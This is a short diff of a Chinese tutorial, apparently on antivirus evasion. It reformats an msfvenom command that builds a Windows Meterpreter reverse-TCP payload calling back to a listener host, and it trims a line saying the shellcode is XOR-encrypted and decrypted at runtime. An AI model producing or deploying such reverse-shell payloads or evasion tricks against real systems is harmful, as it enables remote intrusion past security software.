@@ -23,12 +23,11 @@ Msf
 
 Msf：
 
-| msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.176.129 LPORT=4444 -o payload.bin |
-|---------------------------------------------------------------------------------------------|
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.176.129 LPORT=4444 -o payload.bin
 
 #### 0x02 免杀原理
 
-先对shellcode进行异或加密然后在代码中解密
+对shellcode进行异或
 
 #### 0x03 制作加密shellcode
 
